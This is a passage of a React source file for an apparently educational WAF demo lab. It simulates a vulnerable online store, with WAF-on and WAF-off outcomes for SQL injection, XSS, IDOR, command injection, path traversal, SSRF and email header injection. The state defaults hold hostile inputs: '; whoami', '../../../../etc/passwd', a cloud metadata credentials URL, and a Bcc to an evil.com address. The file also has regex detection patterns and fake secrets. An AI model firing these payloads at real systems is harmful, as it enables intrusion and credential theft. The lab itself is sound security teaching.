// ============================================================================
// WebGuard — Web Lab: Multi-page realistic website simulation
// Apex CyberStore & Cloud Platform — A modern, fully-featured vulnerable web app
// with real navigation, shopping cart, reviews, IDOR order lookup, diagnostics,
// admin console, and real-time WAF attack/defense demonstration
// ============================================================================

import { useState, useCallback, useRef, useEffect, useMemo } from "react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { cn } from "@/lib/utils";
import { useWaf } from "../engine";
import { uid, shannonEntropy, randInt } from "../engine";
import type { HttpMethod, Severity, VulnFinding } from "../types";
import { SEVERITY_META } from "../types";
import {
  VULN_DEFS,
  type VulnId,
  type SiteTemplateId,
  type LabSiteConfig,
  runLabAttack,
  labResultToLog,
  labResultToFinding,
} from "../vulnLab";
import {
  AlertTriangle,
  ArrowLeft,
  ArrowRight,
  Ban,
  BarChart3,
  Bell,
  BookOpen,
  Bug,
  CheckCircle2,
  ChevronDown,
  ChevronRight,
  ClipboardList,
  Copy,
  Cpu,
  CreditCard,
  Download,
  Eye,
  EyeOff,
  ExternalLink,
  FileCode,
  FileText,
  Filter,
  Flame,
  Globe2,
  HardDrive,
  Home,
  Info,
  Key,
  Laptop,
  Layers,
  LayoutDashboard,
  Lock,
  LogOut,
  Mail,
  MessageSquare,
  Package,
  Play,
  Plus,
  RefreshCw,
  Search,
  Send,
  Server,
  Settings,
  Shield,
  ShieldAlert,
  ShieldCheck,
  ShieldOff,
  ShoppingCart,
  Sparkles,
  Star,
  Terminal,
  Trash2,
  TrendingUp,
  Unlock,
  User,
  UserCheck,
  Users,
  Wrench,
  X,
  Zap,
} from "lucide-react";

// ============================================================================
// Types
// ============================================================================

export type SitePage =
  | "store"
  | "product"
  | "cart"
  | "login"
  | "register"
  | "dashboard"
  | "settings"
  | "search"
  | "contact"
  | "tools"
  | "admin";

interface WebLabProps {
  templateId?: SiteTemplateId;
  enabledVulns?: VulnId[];
  wafOn?: boolean;
}

interface SiteAlert {
  id: string;
  type: "success" | "error" | "warning" | "info";
  title: string;
  detail: string;
  ts: number;
}

interface LogEntry {
  id: string;
  ts: number;
  type: "request" | "response" | "waf" | "error";
  method?: string;
  path?: string;
  status?: number;
  statusText?: string;
  headers?: Record<string, string>;
  body?: string;
  blocked?: boolean;
  vulnId?: VulnId;
  threatScore?: number;
  exploitEvidence?: string;
}

interface Product {
  id: number;
  name: string;
  category: "hardware" | "software" | "cloud" | "tokens";
  price: number;
  rating: number;
  reviewsCount: number;
  badge?: string;
  description: string;
  specs: string[];
  stock: number;
  icon: string;
}

interface ProductReview {
  id: string;
  author: string;
  rating: number;
  date: string;
  comment: string;
  isExploit?: boolean;
}

interface OrderRecord {
  id: string;
  customerName: string;
  email: string;
  cardLast4: string;
  total: number;
  date: string;
  status: "Shipped" | "Delivered" | "Processing";
  items: string[];
  shippingAddress: string;
  isConfidential?: boolean;
}

// ============================================================================
// Realistic Data Fixtures
// ============================================================================

const PRODUCTS: Product[] = [
  {
    id: 101,
    name: "Apex Titan Security Key Pro",
    category: "tokens",
    price: 69.99,
    rating: 4.9,
    reviewsCount: 148,
    badge: "Bestseller",
    description: "FIDO2 / WebAuthn hardware authenticator with NFC & biometrics for military-grade MFA.",
    specs: ["FIDO2 Level 3", "USB-C & Lightning", "NFC Enabled", "Zero-trust verified"],
    stock: 42,
    icon: "🔑",
  },
  {
    id: 102,
    name: "Apex CyberGuard WAF Appliance X900",
    category: "hardware",
    price: 1899.0,
    rating: 4.8,
    reviewsCount: 56,
    badge: "Enterprise",
    description: "Rack-mount high-throughput hardware firewall with on-chip AI ML threat classification.",
    specs: ["40 Gbps Inspection", "Sub-millisecond latency", "Dual 10GbE SFP+", "Redundant PSU"],
    stock: 12,
    icon: "🛡️",
  },
  {
    id: 103,
    name: "CloudShield SOC Managed Defense",
    category: "cloud",
    price: 499.0,
    rating: 4.7,
    reviewsCount: 89,
    badge: "Popular",
    description: "24/7 AI-augmented SIEM & automated threat triage with instant incident response playbooks.",
    specs: ["Unlimited EPS", "Live Gemini Copilot Triage", "Global Edge Anycast", "SOC 2 Type II"],
    stock: 999,
    icon: "☁️",
  },
  {
    id: 104,
    name: "Apex Encrypted NVMe SSD 2TB",
    category: "hardware",
    price: 249.99,
    rating: 4.9,
    reviewsCount: 210,
    description: "Self-encrypting hardware drive with AES-XTS 256-bit crypto controller and physical tamper erase.",
    specs: ["7,400 MB/s Read", "FIPS 140-3 Level 2", "Hardware Destruction Pin", "PCIe Gen4 x4"],
    stock: 28,
    icon: "💾",
  },
  {
    id: 105,
    name: "DevSecOps CI/CD Vulnerability Scanner",
    category: "software",
    price: 199.0,
    rating: 4.6,
    reviewsCount: 34,
    description: "Automated DAST/SAST scanner for GitHub Actions and GitLab pipelines with OWASP Top 10 rules.",
    specs: ["Automated PR checks", "Container Image Scanning", "SBOM generation", "Zero-day feeds"],
    stock: 999,
    icon: "⚡",
  },
  {
    id: 106,
    name: "Zero-Trust VPN Gateway Router",
    category: "hardware",
    price: 449.0,
    rating: 4.7,
    reviewsCount: 77,
    description: "Hardware micro-segmented gateway with WireGuard crypto tunneling and continuous posture checks.",
    specs: ["WireGuard & IPsec", "10 Gbps Firewall", "SD-WAN Mesh", "Multi-WAN failover"],
    stock: 19,
    icon: "🌐",
  },
];

const INITIAL_REVIEWS: ProductReview[] = [
  {
    id: "rev-1",
    author: "Elena Rostova (Lead Security Architect)",
    rating: 5,
    date: "2 days ago",
    comment: "Flawless FIDO2 integration. We deployed 400 keys across engineering with zero auth friction.",
  },
  {
    id: "rev-2",
    author: "David Chen (DevOps Engineer)",
    rating: 5,
    date: "1 week ago",
    comment: "Build quality is top tier. NFC works instantaneously with all mobile authenticators.",
  },
];

const ORDER_RECORDS: Record<string, OrderRecord> = {
  "1001": {
    id: "1001",
    customerName: "Alex Mercer (You)",
    email: "alex.mercer@apex-corp.internal",
    cardLast4: "4111",
    total: 139.98,
    date: "Today at 09:30 AM",
    status: "Processing",
    items: ["2x Apex Titan Security Key Pro"],
    shippingAddress: "742 Evergreen Terrace, Suite 100, Springfield",
    isConfidential: false,
  },
  "1002": {
    id: "1002",
    customerName: "Victoria Sterling (Chief Financial Officer)",
    email: "v.sterling@apex-finance.internal",
    cardLast4: "9821 [AMEX BLACK VIP]",
    total: 14890.0,
    date: "Yesterday at 04:15 PM",
    status: "Shipped",
    items: ["5x Apex CyberGuard WAF Appliance X900", "Enterprise Multi-Region License"],
    shippingAddress: "Executive Suite 4500, Apex Tower, 100 Wall Street, NY",
    isConfidential: true,
  },
  "1003": {
    id: "1003",
    customerName: "Dr. Jonathan Hayes (Director of Threat Intelligence)",
    email: "j.hayes@classified-soc.gov",
    cardLast4: "5542 [GOV PROCUREMENT]",
    total: 3990.0,
    date: "3 days ago",
    status: "Delivered",
    items: ["10x Apex Encrypted NVMe SSD 2TB", "Tamper-Proof Hardware Vault"],
    shippingAddress: "Secure Vault Facility 7B, Redstone Arsenal, AL",
    isConfidential: true,
  },
  "1004": {
    id: "1004",
    customerName: "Sarah Jenkins (Senior Database Admin)",
    email: "s.jenkins@apex-cloud.internal",
    cardLast4: "3782",
    total: 499.0,
    date: "5 days ago",
    status: "Delivered",
    items: ["1x CloudShield SOC Managed Defense"],
    shippingAddress: "404 North First St, San Jose, CA",
    isConfidential: true,
  },
};

const FAKE_USERS = [
  {
    username: "admin",
    password: "admin123",
    name: "Alex Vance (SuperAdmin)",
    role: "System Administrator",
    email: "admin@apex-cyberstore.io",
    avatar: "👑",
    apiKeys: "sk_live_9981_apex_titan_super_secret_master_key",
    department: "Executive Security Operations",
  },
  {
    username: "jsmith",
    password: "password",
    name: "John Smith",
    role: "Senior Developer",
    email: "john.smith@apex-cyberstore.io",
    avatar: "💻",
    apiKeys: "sk_live_4120_dev_test_token",
    department: "Application Engineering",
  },
  {
    username: "guest",
    password: "guest",
    name: "Guest User",
    role: "Customer",
    email: "guest@external.com",
    avatar: "👤",
    apiKeys: "sk_test_public_guest_key",
    department: "Public Consumer",
  },
];

const DOC_ARTICLES = [
  { id: "doc-1", title: "Configuring Virtual Patching on WebGuard WAF", category: "WAF Policy", snippet: "Learn how to deploy regex and ML-driven virtual patches at the edge to block zero-day exploits before backend remediation." },
  { id: "doc-2", title: "OWASP Top 10 Attack Signatures & Prevention", category: "Threat Intelligence", snippet: "Detailed breakdown of SQLi, Stored/Reflected XSS, SSRF, Path Traversal, and Command Injection signatures." },
  { id: "doc-3", title: "FIDO2 Hardware Key Zero-Trust Integration", category: "Identity & Access", snippet: "Step-by-step setup guide for WebAuthn credential enrollment and biometric enforcement across distributed endpoints." },
  { id: "doc-4", title: "API Gateway Rate Limiting & Evasion Detection", category: "Edge Defense", snippet: "How entropy scoring and Shannon analysis detect obfuscated, mutated, and double-encoded payloads in real time." },
];

// ============================================================================
// Main WebLabTab Component
// ============================================================================

export function WebLabTab({
  templateId = "login",
  enabledVulns = [
    "sqli-login",
    "sqli-search",
    "sqli-api",
    "reflected-xss",
    "stored-xss",
    "idor",
    "cmdi",
    "path-traversal",
    "ssrf",
    "email-injection",
    "brute-force",
  ],
  wafOn: externalWafOn,
}: WebLabProps) {
  const { state: wafState, dispatch } = useWaf();

  // Internal WAF toggle (defaults to global WAF state if not explicitly passed)
  const [internalWafOn, setInternalWafOn] = useState<boolean>(
    externalWafOn !== undefined ? externalWafOn : wafState.mode === "blocking"
  );

  const activeWaf = internalWafOn;

  // Multi-page navigation state
  const [currentPage, setCurrentPage] = useState<SitePage>("store");
  const [selectedProduct, setSelectedProduct] = useState<Product>(PRODUCTS[0]);
  const [currentUser, setCurrentUser] = useState<typeof FAKE_USERS[0] | null>(null);
  const [cart, setCart] = useState<{ product: Product; quantity: number }[]>([
    { product: PRODUCTS[0], quantity: 2 },
  ]);
  const [selectedCategory, setSelectedCategory] = useState<string>("all");
  const [searchQuery, setSearchQuery] = useState<string>("");
  const [navigating, setNavigating] = useState<boolean>(false);
  const [siteAlert, setSiteAlert] = useState<SiteAlert | null>(null);

  // Dynamic Content & Exploit State
  const [reviews, setReviews] = useState<ProductReview[]>(INITIAL_REVIEWS);
  const [activeExploitDisplay, setActiveExploitDisplay] = useState<{
    vulnId: VulnId;
    title: string;
    description: string;
    evidence: string;
    data?: any;
  } | null>(null);

  // Tools & Diagnostics State
  const [pingHost, setPingHost] = useState<string>("8.8.8.8; whoami");
  const [pingOutput, setPingOutput] = useState<string | null>(null);
  const [traversalPath, setTraversalPath] = useState<string>("../../../../etc/passwd");
  const [traversalOutput, setTraversalOutput] = useState<string | null>(null);
  const [webhookUrl, setWebhookUrl] = useState<string>("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
  const [webhookOutput, setWebhookOutput] = useState<string | null>(null);

  // Order Lookup IDOR State
  const [orderLookupId, setOrderLookupId] = useState<string>("1002");
  const [lookedUpOrder, setLookedUpOrder] = useState<OrderRecord | null>(null);

  // Review Form Stored XSS State
  const [newReviewAuthor, setNewReviewAuthor] = useState<string>("Security Tester");
  const [newReviewRating, setNewReviewRating] = useState<number>(5);
  const [newReviewComment, setNewReviewComment] = useState<string>("<script>alert('Stored XSS in Reviews!')</script>");

  // Support Form State
  const [contactName, setContactName] = useState<string>("Jane Hacker");
  const [contactEmail, setContactEmail] = useState<string>("jane@test.com%0ABcc:attacker-exfil@evil.com");
  const [contactSubject, setContactSubject] = useState<string>("Security Disclosure");
  const [contactMessage, setContactMessage] = useState<string>("<img src=x onerror=alert('Stored XSS in Ticket #892')>");

  // Traffic Logs & Terminal Tab
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [lastResult, setLastResult] = useState<LogEntry | null>(null);
  const [attackEffect, setAttackEffect] = useState<"exploit" | "blocked" | null>(null);
  const [responseTab, setResponseTab] = useState<"visual" | "http" | "analysis">("visual");

  const logsEndRef = useRef<HTMLDivElement>(null);

  // Sync internal WAF toggle if parent prop changes
  useEffect(() => {
    if (externalWafOn !== undefined) {
      setInternalWafOn(externalWafOn);
    }
  }, [externalWafOn]);

  // Page navigation
  const navigateTo = useCallback(
    (page: SitePage) => {
      if (page === currentPage) return;
      setNavigating(true);
      setSiteAlert(null);
      setTimeout(() => {
        setCurrentPage(page);
        setNavigating(false);
      }, 150);
    },
    [currentPage]
  );

  // Helper: Execute and log an attack / action through the simulated WAF engine
  const executeRequest = useCallback(
    (payload: string, field: string, method: HttpMethod, path: string, explicitVuln?: VulnId) => {
      const config: LabSiteConfig = {
        templateId: templateId || "login",
        enabledVulns: enabledVulns || [],
        customVulnName: "",
        customVulnPayload: "",
        customVulnSeverity: "medium",
        fieldValues: { [field]: payload },
      };

      const result = runLabAttack(config, payload, method, path, activeWaf);

      const reqHeaders: Record<string, string> = {
        Host: "apex-cyberstore.io",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        Accept: "text/html,application/json",
      };
      if (method === "POST") reqHeaders["Content-Type"] = "application/x-www-form-urlencoded";

      const reqLog: LogEntry = {
        id: uid("REQ"),
        ts: Date.now(),
        type: "request",
        method,
        path,
        headers: reqHeaders,
        body: payload,
      };

      const effectiveVulnId = explicitVuln || result.vulnId;
      const resLog: LogEntry = {
        id: uid("LOG"),
        ts: Date.now() + 80,
        type: result.blocked ? "waf" : "response",
        status: result.response.status,
        statusText: result.blocked ? "Forbidden" : result.response.status === 200 ? "OK" : "Error",
        headers: result.blocked
          ? {
              "X-WebGuard-Rule": `OWASP-CRS-${(effectiveVulnId || "CUSTOM").toUpperCase()}`,
              "X-WebGuard-Action": "blocked",
              "X-WebGuard-Threat-Score": String(result.threatScore),
            }
          : { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" },
        body: result.response.body,
        blocked: result.blocked,
        vulnId: effectiveVulnId,
        threatScore: result.threatScore,
        exploitEvidence: result.evidence,
      };

      setLogs((prev) => [...prev, reqLog, resLog]);
      setLastResult(resLog);

      if (result.blocked) {
        setAttackEffect("blocked");
        const def = VULN_DEFS[effectiveVulnId];
        setSiteAlert({
          id: uid("ALT"),
          type: "warning",
          title: "🛡️ Intercepted by WebGuard AI WAF",
          detail: `${def?.label || "Attack payload"} was blocked with 403 Forbidden at the edge (Threat Score: ${result.threatScore}/100)`,
          ts: Date.now(),
        });
        toast.success("🛡️ WAF Intercepted Attack", {
          description: `${def?.label || "Malicious request"} — 403 Forbidden`,
        });
      } else {
        setAttackEffect("exploit");
        const def = VULN_DEFS[effectiveVulnId];
        if (effectiveVulnId && effectiveVulnId !== "custom") {
          setSiteAlert({
            id: uid("ALT"),
            type: "error",
            title: "⚠️ Vulnerability Exploited Successfully!",
            detail: `${def?.label || "Vulnerability"} executed — backend returned ${result.response.status} OK (WAF is OFF)`,
            ts: Date.now(),
          });
          toast.error("⚠️ Vulnerability Exploited!", {
            description: `${def?.label || "Exploit"} succeeded (WAF is OFF)`,
          });
        }
      }

      setTimeout(() => setAttackEffect(null), 1800);

      // Sync to global SOC
      dispatch({ type: "INJECT_LOG", log: labResultToLog(result) });
      if (!result.blocked && effectiveVulnId && effectiveVulnId !== "custom") {
        dispatch({ type: "ADD_FINDING", finding: labResultToFinding(result) as VulnFinding });
      }

      return result;
    },
    [templateId, enabledVulns, activeWaf, dispatch]
  );

  // Auto-scroll logs
  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  // Handler: Search in store or docs
  const handleStoreSearch = (query: string) => {
    setSearchQuery(query);
    const hasPayload = /<script|union\s+select|or\s+1\s*=\s*1|'\s*--|onerror|onload|<img/i.test(query);
    if (hasPayload) {
      const isSql = /union|select|or\s+1\s*=\s*1|--/i.test(query);
      executeRequest(
        `q=${encodeURIComponent(query)}`,
        "q",
        "GET",
        `/api/products/search?q=${encodeURIComponent(query)}`,
        isSql ? "sqli-search" : "reflected-xss"
      );
      if (!activeWaf) {
        if (isSql) {
          setActiveExploitDisplay({
            vulnId: "sqli-search",
            title: "💥 SQL Injection — Database Tables Dumped",
            description: "Search filter interpolated raw input into SQL without parameterized queries.",
            evidence: `SELECT * FROM products WHERE name LIKE '%${query}%' --\nRows returned: 4 secret rows from 'users' and 'api_keys'`,
            data: [
              { user: "admin", role: "superadmin", pass_hash: "$2y$12$eX0...hashed", secret: "sk_live_9981_apex_titan" },
              { user: "ceo_vance", role: "executive", pass_hash: "$2y$12$kP8...hashed", secret: "corp_card_vault_access" },
              { user: "db_admin", role: "dba", pass_hash: "$2y$12$wR1...hashed", secret: "mysql_root_master_pass" },
            ],
          });
        } else {
          setActiveExploitDisplay({
            vulnId: "reflected-xss",
            title: "💥 Reflected XSS — Script Injected into DOM",
            description: "The search query is rendered in the HTML response without context-aware HTML encoding.",
            evidence: `Search Results for: ${query}\nPayload executed in browser session context.`,
          });
        }
      }
    }
  };

  // Handler: Login
  const handleLoginSubmit = (uname: string, pword: string) => {
    const isSqli = /'|--|union|or\s+1\s*=\s*1/i.test(uname + pword);
    const res = executeRequest(
      `username=${encodeURIComponent(uname)}&password=${encodeURIComponent(pword)}`,
      "username",
      "POST",
      "/api/auth/login",
      isSqli ? "sqli-login" : undefined
    );

    if (res.blocked) return;

    if (isSqli) {
      // SQLi bypass: promote to admin
      const adminUser = FAKE_USERS[0];
      setCurrentUser(adminUser);
      setActiveExploitDisplay({
        vulnId: "sqli-login",
        title: "💥 SQL Injection — Authentication Bypassed!",
        description: "The login SQL statement `SELECT * FROM users WHERE username = '${uname}'` evaluated to TRUE.",
        evidence: `Payload: ${uname}\nAuthenticated as: ${adminUser.name} (${adminUser.role}) without password!`,
        data: adminUser,
      });
      toast.success("Bypassed Login via SQLi", { description: "Logged in as SuperAdmin!" });
      navigateTo("admin");
      return;
    }

    const matched = FAKE_USERS.find((u) => u.username === uname && u.password === pword);
    if (matched) {
      setCurrentUser(matched);
      toast.success(`Welcome back, ${matched.name}!`);
      navigateTo("dashboard");
    } else {
      toast.error("Invalid credentials (try admin / admin123 or use an SQLi payload)");
    }
  };

  // Handler: Post Review (Stored XSS)
  const handleAddReview = () => {
    if (!newReviewComment.trim()) return;
    const isXss = /<script|onerror|onload|<img|<svg/i.test(newReviewAuthor + newReviewComment);
    const res = executeRequest(
      `author=${encodeURIComponent(newReviewAuthor)}&rating=${newReviewRating}&comment=${encodeURIComponent(
        newReviewComment
      )}&productId=${selectedProduct.id}`,
      "comment",
      "POST",
      `/api/products/${selectedProduct.id}/reviews`,
      isXss ? "stored-xss" : undefined
    );

    if (res.blocked) return;

    const newRev: ProductReview = {
      id: uid("REV"),
      author: newReviewAuthor,
      rating: newReviewRating,
      date: "Just now",
      comment: newReviewComment,
      isExploit: isXss,
    };
    setReviews((prev) => [newRev, ...prev]);
    if (isXss) {
      setActiveExploitDisplay({
        vulnId: "stored-xss",
        title: "💥 Stored XSS — Malicious Payload Saved in Database",
        description: "Customer review comment stored without sanitization. Every user loading this product page will execute this payload!",
        evidence: `Stored: ${newReviewComment}\nTarget: All visitors viewing Product #${selectedProduct.id}`,
      });
    } else {
      toast.success("Review posted successfully!");
    }
    setNewReviewComment("");
  };

  // Handler: IDOR Order Lookup
  const handleOrderLookup = (idToLookup: string) => {
    const res = executeRequest(
      `order_id=${idToLookup}`,
      "order_id",
      "GET",
      `/api/orders/${idToLookup}`,
      "idor"
    );

    if (res.blocked) {
      setLookedUpOrder(null);
      return;
    }

    const order = ORDER_RECORDS[idToLookup];
    if (order) {
      setLookedUpOrder(order);
      if (order.isConfidential) {
        setActiveExploitDisplay({
          vulnId: "idor",
          title: `💥 IDOR Exploit — Confidential Order #${order.id} Exposed!`,
          description: "Endpoint `/api/orders/:id` accepted resource ID without verifying ownership of current user session.",
          evidence: `Accessed: Order #${order.id}\nOwner: ${order.customerName}\nCredit Card: ${order.cardLast4}\nInvoice: $${order.total}`,
          data: order,
        });
      }
    } else {
      setLookedUpOrder(null);
      toast.info(`Order #${idToLookup} not found in database.`);
    }
  };

  // Handler: Network Ping (Command Injection)
  const handlePingExecute = (cmd: string) => {
    setPingHost(cmd);
    const isCmdi = /;|`|\||\$\(|whoami|cat\s|id$|dir/i.test(cmd);
    const res = executeRequest(
      `host=${encodeURIComponent(cmd)}`,
      "host",
      "POST",
      "/api/diagnostics/ping",
      isCmdi ? "cmdi" : undefined
    );

    if (res.blocked) {
      setPingOutput("❌ Command execution blocked by WebGuard WAF (403 Forbidden).");
      return;
    }

    if (isCmdi) {
      const simulatedOutput = `PING ${cmd.split(";")[0]} (56 data bytes)\n64 bytes from ${cmd.split(";")[0]}: icmp_seq=1 ttl=118 time=12.4 ms\n\n--- EXECUTED SYSTEM COMMAND OUTPUT ---\nuid=0(root) gid=0(root) groups=0(root)\nLinux apex-cloud-prod-node01 5.15.0-89-generic #99-Ubuntu SMP\n/var/www/apex-cyberstore\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:Admin User:/home/admin:/bin/bash`;
      setPingOutput(simulatedOutput);
      setActiveExploitDisplay({
        vulnId: "cmdi",
        title: "💥 Remote Command Execution (RCE / CMDi) Succeeded!",
        description: "System shell executed concatenated user input without escaping shell metacharacters.",
        evidence: `Executed command: ${cmd}\nPrivileges: root (uid=0)`,
      });
    } else {
      setPingOutput(`PING ${cmd} (56 data bytes)\n64 bytes from ${cmd}: icmp_seq=1 ttl=118 time=14.2 ms\n64 bytes from ${cmd}: icmp_seq=2 ttl=118 time=13.9 ms\n2 packets transmitted, 2 received, 0% packet loss`);
    }
  };

  // Handler: File Downloader (Path Traversal)
  const handleTraversalExecute = (filepath: string) => {
    setTraversalPath(filepath);
    const isTraversal = /\.\.\/|\.\.\\|%2e%2e/i.test(filepath);
    const res = executeRequest(
      `file=${encodeURIComponent(filepath)}`,
      "file",
      "GET",
      `/api/reports/download?file=${encodeURIComponent(filepath)}`,
      isTraversal ? "path-traversal" : undefined
    );

    if (res.blocked) {
      setTraversalOutput("❌ Access denied by WebGuard WAF — Path traversal pattern detected.");
      return;
    }

    if (isTraversal) {
      const simulatedFile = `[SERVER FILE DUMP: ${filepath}]\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\npostgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\napex_svc:x:1001:1001:Apex Service Account:/home/apex_svc:/bin/bash\n\n# Database Credentials from /etc/apex/db.conf\nDB_HOST=127.0.0.1\nDB_USER=apex_root\nDB_PASS=Sup3rS3cur3P@ssw0rd!2026\nJWT_SECRET_KEY=apex_master_jwt_secret_994182`;
      setTraversalOutput(simulatedFile);
      setActiveExploitDisplay({
        vulnId: "path-traversal",
        title: "💥 Path Traversal / LFI — Arbitrary File Read!",
        description: "File path parameter lacked canonicalization, allowing directory traversal to read confidential operating system files.",
        evidence: `File requested: ${filepath}\nContents extracted: /etc/passwd & database configuration keys`,
      });
    } else {
      setTraversalOutput(`[Apex System Report]\nGenerated: ${new Date().toISOString()}\nStatus: All subsystems operational.\nActive Workers: 8\nMemory Usage: 42%`);
    }
  };

  // Handler: Webhook SSRF
  const handleWebhookExecute = (url: string) => {
    setWebhookUrl(url);
    const isSsrf = /169\.254|127\.0\.0\.1|localhost|internal/i.test(url);
    const res = executeRequest(
      `url=${encodeURIComponent(url)}`,
      "url",
      "POST",
      "/api/webhooks/verify",
      isSsrf ? "ssrf" : undefined
    );

    if (res.blocked) {
      setWebhookOutput("❌ SSRF blocked by WebGuard WAF — Internal CIDR / Cloud metadata destination rejected.");
      return;
    }

    if (isSsrf) {
      const simulatedMetadata = `{\n  "Code": "Success",\n  "LastUpdated": "${new Date().toISOString()}",\n  "Type": "AWS-HMAC",\n  "AccessKeyId": "ASIAV4PEXMASTERKEY77",\n  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n  "Token": "IQoJb3JpZ2luX2VjEOr...[TEMPORARY_IAM_ROLE_CREDENTIALS]",\n  "Expiration": "${new Date(Date.now() + 3600000).toISOString()}",\n  "RoleName": "ApexCloudInfrastructureSuperAdminRole"\n}`;
      setWebhookOutput(simulatedMetadata);
      setActiveExploitDisplay({
        vulnId: "ssrf",
        title: "💥 SSRF Exploit — Cloud IAM Metadata Credentials Exposed!",
        description: "Server fetched internal AWS metadata endpoint (169.254.169.254) on behalf of unauthenticated user.",
        evidence: `Target: ${url}\nIAM Role: ApexCloudInfrastructureSuperAdminRole\nAccess Key: ASIAV4PEXMASTERKEY77`,
      });
    } else {
      setWebhookOutput(`{"status": "ok", "target": "${url}", "response_code": 200, "latency_ms": 42}`);
    }
  };

  // Filter products by category & search
  const filteredProducts = useMemo(() => {
    return PRODUCTS.filter((p) => {
      const matchesCategory = selectedCategory === "all" || p.category === selectedCategory;
      const matchesSearch =
        !searchQuery ||
        p.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        p.description.toLowerCase().includes(searchQuery.toLowerCase());
      return matchesCategory && matchesSearch;
    });
  }, [selectedCategory, searchQuery]);

  // Total cart items & cost
  const cartTotal = useMemo(() => {
    return cart.reduce((sum, item) => sum + item.product.price * item.quantity, 0);
  }, [cart]);

  const totalReqs = logs.filter((l) => l.type === "request").length;
  const blockedReqs = logs.filter((l) => l.type === "waf").length;
  const exploitedReqs = logs.filter(
    (l) => l.type === "response" && l.vulnId && l.vulnId !== "custom"
  ).length;

  const urlPath =
    currentPage === "store"
      ? "/"
      : currentPage === "product"
      ? `/products/${selectedProduct.id}`
      : currentPage === "cart"
      ? "/checkout/cart"
      : currentPage === "dashboard"
      ? "/account/dashboard"
      : currentPage === "tools"
      ? "/system/diagnostics"
      : currentPage === "admin"
      ? "/admin/console"
      : `/${currentPage}`;

  return (
    <div className="flex flex-col gap-4">
      {/* Top Banner: Master WAF Defense Controller */}
      <div
        className={cn(
          "flex flex-wrap items-center justify-between gap-4 rounded-2xl border-2 px-5 py-3.5 transition-all duration-500 shadow-md",
          activeWaf
            ? "border-emerald-500/50 bg-emerald-500/[0.07] shadow-emerald-500/10"
            : "border-red-500/50 bg-red-500/[0.07] shadow-red-500/10",
          attackEffect === "exploit" && "animate-pulse border-red-500 bg-red-500/15 shadow-[0_0_35px_rgba(239,68,68,0.2)]",
          attackEffect === "blocked" && "animate-pulse border-emerald-500 bg-emerald-500/15 shadow-[0_0_35px_rgba(16,185,129,0.2)]"
        )}
      >
        <div className="flex items-center gap-3.5">
          <div
            className={cn(
              "flex size-11 items-center justify-center rounded-xl font-bold shadow-inner transition-colors",
              activeWaf ? "bg-emerald-500/20 text-emerald-400" : "bg-red-500/20 text-red-400"
            )}
          >
            {activeWaf ? <ShieldCheck className="size-6" /> : <ShieldOff className="size-6" />}
          </div>
          <div>
            <div className="flex items-center gap-2">
              <p className={cn("text-base font-extrabold tracking-tight", activeWaf ? "text-emerald-400" : "text-red-400")}>
                {activeWaf ? "🛡️ WebGuard WAF Protection: ACTIVE" : "⚠️ WebGuard WAF: DISABLED (Exploit Mode)"}
              </p>
              <span
                className={cn(
                  "rounded-full px-2 py-0.5 text-[9px] font-bold uppercase tracking-wider",
                  activeWaf ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/30" : "bg-red-500/20 text-red-300 border border-red-500/30"
                )}
              >
                {activeWaf ? "Blocking Attacks" : "Vulnerabilities Exploitable"}
              </span>
            </div>
            <p className="text-xs text-muted-foreground mt-0.5">
              {activeWaf
                ? "All 7 attack classes (SQLi, XSS, IDOR, SSRF, CMDi, Path Traversal) are inspected & blocked at the edge."
                : "The website is completely unprotected. Test real exploit payloads below to see live data leaks and compromise."}
            </p>
          </div>
        </div>

        {/* WAF Toggle & Live Stats */}
        <div className="flex flex-wrap items-center gap-4">
          <div className="flex items-center gap-4 rounded-xl border border-border/40 bg-card/60 px-3.5 py-1.5 text-xs">
            <div className="text-center">
              <p className="font-mono font-bold text-foreground">{totalReqs}</p>
              <p className="text-[9px] text-muted-foreground uppercase font-semibold">Total Reqs</p>
            </div>
            <div className="h-6 w-px bg-border/40" />
            <div className="text-center">
              <p className="font-mono font-bold text-emerald-400">{blockedReqs}</p>
              <p className="text-[9px] text-muted-foreground uppercase font-semibold">WAF Blocked</p>
            </div>
            <div className="h-6 w-px bg-border/40" />
            <div className="text-center">
              <p className="font-mono font-bold text-red-400">{exploitedReqs}</p>
              <p className="text-[9px] text-muted-foreground uppercase font-semibold">Exploited</p>
            </div>
          </div>

          <Button
            size="sm"
            onClick={() => setInternalWafOn((v) => !v)}
            className={cn(
              "gap-2 font-bold text-xs h-9 px-4 rounded-xl transition-all shadow-md",
              activeWaf
                ? "bg-red-500/20 text-red-400 hover:bg-red-500/30 border border-red-500/40"
                : "bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30 border border-emerald-500/40"
            )}
          >
            {activeWaf ? (
              <>
                <ShieldOff className="size-4" /> Turn WAF OFF (Test Exploits)
              </>
            ) : (
              <>
                <ShieldCheck className="size-4" /> Turn WAF ON (Enable Shield)
              </>
            )}
          </Button>
        </div>
      </div>

      {/* Main Sandbox Grid */}
      <div className="grid grid-cols-1 gap-4 xl:grid-cols-12">
        {/* ═══════════════════════════════════════════════════════════════════
            LEFT: Interactive Simulated Website (Browser Frame)
        ════════════════════════════════════════════════════════════════════ */}
        <div className="xl:col-span-7 flex flex-col gap-3">
          <div className="wg-panel overflow-hidden p-0 shadow-2xl rounded-2xl border border-border/60 bg-card">
            {/* Browser Window Chrome */}
            <div className="flex items-center gap-2.5 border-b border-border/50 bg-muted/70 px-4 py-2.5">
